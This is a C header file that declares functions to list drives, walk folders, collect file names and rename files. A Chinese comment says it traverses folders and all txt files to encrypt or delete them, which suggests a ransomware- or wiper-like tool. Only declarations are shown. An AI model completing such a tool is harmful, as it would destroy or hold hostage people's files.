#pragma once
#ifndef SEARCHFILE_H_INCLUDE
#define SEARCHFILE_H

void sfile(char* path);
DWORD* ssdikstr(void);
char* re_strtok(char *);
//遍历文件夹，遍历所有txt文件，加密或者删除
void find_all(char* path);
typedef struct _test
{
	char* t_char;
	char* t_str[3];
}testdef;
testdef test(void);
typedef struct _disksec
{
	char* diskpath[100];
	int disknum;
}disksec;
disksec finddiskpath(void);
typedef struct _find_top_file
{
	
	char* filename[100];
	int filenums;
}findtopfile;
findtopfile findfolder(const char* path);
typedef struct _findfile
{
	char* file[100];
	int filenum;
}findfile;
findfile seachfile(const char* folder);
void refilename(const char* filename,const char* path);
#endif // !SEARCHFILE_H_INCLUDE

